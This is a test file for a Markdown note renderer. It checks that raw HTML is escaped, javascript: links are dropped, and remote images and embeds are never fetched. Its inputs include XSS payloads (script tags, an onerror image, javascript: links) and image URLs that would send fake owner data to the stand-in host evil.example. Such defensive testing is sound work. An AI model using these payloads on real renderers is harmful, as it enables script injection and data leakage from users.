import { describe, expect, test } from "bun:test";
import { readFileSync } from "node:fs";
import { extractMain, renderNoteHtml } from "./renderMarkdown";
import { blockedImageHosts, showAllowedImages } from "./renderMarkdown";

const styles = readFileSync(new URL("./notes.css", import.meta.url), "utf8");

describe("note renderer", () => {
  test("renders Markdown to the inner HTML of main.fmd", async () => {
    const html = await renderNoteHtml("# Hi\n\n- **0:20** first\n- [ ] todo\n");
    expect(html).toContain("<h1");
    expect(html).toContain("<strong>0:20</strong>");
    expect(html).toContain('<li class="task">');
    expect(html).not.toContain("<main");
    expect(html).not.toContain("<style");
  });

  test("keeps formatted checklist prose in one inline text flow", async () => {
    const html = await renderNoteHtml("- [ ] move **important** and _italic_ words\n");
    expect(html).toContain('move <strong>important</strong> and <em>italic</em> words</li>');
    expect(styles).toMatch(/\.soft-skin \.fmd li\.task\s*\{[^}]*position:\s*relative;[^}]*padding-left:\s*1\.5em;/s);
    expect(styles).toMatch(/\.soft-skin \.fmd li\.task input\s*\{[^}]*position:\s*absolute;/s);
    expect(styles).not.toMatch(/\.soft-skin \.fmd li\.task\s*\{[^}]*display:\s*flex;/s);
  });

  test("escapes raw HTML and drops javascript: links", async () => {
    const raw = await renderNoteHtml(
      "<script>alert(1)</script>\n\nhi <img src=x onerror=alert(1)>",
    );
    expect(raw).not.toContain("<script");
    expect(raw).not.toContain("<img");
    expect(raw).toContain("&lt;script&gt;");
    const link = await renderNoteHtml(
      "[x](javascript:alert(1)) and [y](https://a.b)",
    );
    expect(link).not.toContain("javascript:");
    expect(link).toContain('href="https://a.b"');
  });

  test("an image in a note never gets a source: it shows as its description and host", async () => {
    const html = await renderNoteHtml(
      [
        "![chart](https://evil.example/leak?d=FAKE-OWNER-DATA-1234)",
        "![ref image][r]",
        '[r]: https://evil.example:8443/ref?d=FAKE-OWNER-DATA-1234 "t"',
        "[![badge](https://evil.example/badge.png)](https://evil.example/target)",
        "![local](/own.png)",
      ].join("\n\n"),
    );
    expect(html).not.toMatch(/<(img|picture|source|video|iframe)\b/i);
    expect(html).not.toMatch(/\s(src|srcset|poster)=/i);
    expect(html).toContain("Image not loaded: chart (evil.example)<");
    expect(html).toContain("Image not loaded: ref image (evil.example:8443)<");
    expect(html).toContain("Image not loaded: badge (evil.example)<");
    expect(html).toContain("Image not loaded: local<");
    expect(html).not.toMatch(/url\(/i);
    // The address waits in data attributes the browser never fetches; it is not in any text or loadable attribute.
    expect(html.replace(/ data-note-image-src="[^"]*"/g, "")).not.toContain("FAKE-OWNER-DATA-1234");
  });

  test("a link whose label already is its address says the host once", async () => {
    const html = await renderNoteHtml("see https://bare.example/a/b and [bare.example](https://bare.example)");
    expect(html).not.toContain("note-link-host");
  });

  test("a web link shows its full host beside the label", async () => {
    const html = await renderNoteHtml(
      "[docs](https://evil.example:8443/p?a=1&b=2) and [good.example](https://evil.example/x) and [mail](mailto:a@b.example)",
    );
    expect(html).toContain('href="https://evil.example:8443/p?a=1&amp;b=2">docs</a> <span class="note-link-host">(evil.example:8443)</span>');
    expect(html).toContain('>good.example</a> <span class="note-link-host">(evil.example)</span>');
    expect(html).toContain('>mail</a>');
    expect(html).not.toContain("(b.example)");
  });

  test("an Allow turns one site's images into images and leaves the others held back", async () => {
    const html = await renderNoteHtml("![a](https://one.example/a.png?x=1&y=2)\n\n![b](https://two.example/b.png)\n\n![c](https://one.example/c.png)\n\n![d](/own.png)");
    expect(blockedImageHosts(html)).toEqual(["one.example", "two.example"]);
    expect(showAllowedImages(html, new Set())).toBe(html);
    const shown = showAllowedImages(html, new Set(["one.example"]));
    expect([...shown.matchAll(/<img\b[^>]*>/g)].map((m) => /\ssrc="([^"]*)"/.exec(m[0])![1])).toEqual(["https://one.example/a.png?x=1&amp;y=2", "https://one.example/c.png"]);
    expect(shown).toContain("Image not loaded: b (two.example)<");
    expect(blockedImageHosts(shown, new Set(["one.example"]))).toEqual(["two.example"]);
  });

  test("an image's text cannot pose as a placeholder or an allowed image", async () => {
    const html = await renderNoteHtml('<span class="note-image" data-note-image-host="evil.example" data-note-image-src="https://evil.example/x" data-note-image-alt="">x</span> <img src="https://evil.example/y">');
    expect(blockedImageHosts(html)).toEqual([]);
    expect(showAllowedImages(html, new Set(["evil.example"]))).not.toMatch(/<img\b/);
  });

  // A backstop for the engine: if an upgrade starts drawing a new embed, this fails instead of the note loading it.
  test("whatever Markdown a note holds, the rendered output has nothing the browser would fetch on its own", async () => {
    const corpus = [
      "![inline](https://evil.example/a.png?d=1)",
      "![ref][r]\n\n[r]: https://evil.example/ref.png",
      "[![linked](https://evil.example/b.png)](https://evil.example/target)",
      "https://evil.example/autolinked.png",
      "<https://evil.example/angle.png>",
      "![data uri](data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=)",
      "![proto relative](//evil.example/c.png)",
      "<img src=https://evil.example/raw.png>\n\n<video src=https://evil.example/v.mp4 poster=https://evil.example/p.png></video>\n\n<source srcset=https://evil.example/s.png>\n\n<iframe src=https://evil.example/f></iframe>\n\n<object data=https://evil.example/o></object>\n\n<div style=\"background:url(https://evil.example/bg.png)\">x</div>",
      "[link](https://evil.example/page) and ![x](<https://evil.example/space in.png>)",
    ].join("\n\n");
    const html = await renderNoteHtml(corpus);
    // Escaped raw HTML shows as text, so look at real tags only.
    const tags = html.match(/<[a-z][^>]*>/gi) ?? [];
    expect(tags.length).toBeGreaterThan(0);
    for (const tag of tags) {
      expect(tag).not.toMatch(/^<(img|picture|source|video|audio|iframe|object|embed|link|style|script|svg)\b/i);
      expect(tag).not.toMatch(/\s(src|srcset|poster|data|background|style|ping|action|formaction)=/i);
      expect(tag).not.toMatch(/url\(/i);
    }
  });

  test("an output without main.fmd is an error, not an empty note", () => {
    expect(() => extractMain("<html></html>")).toThrow("main");
  });
});
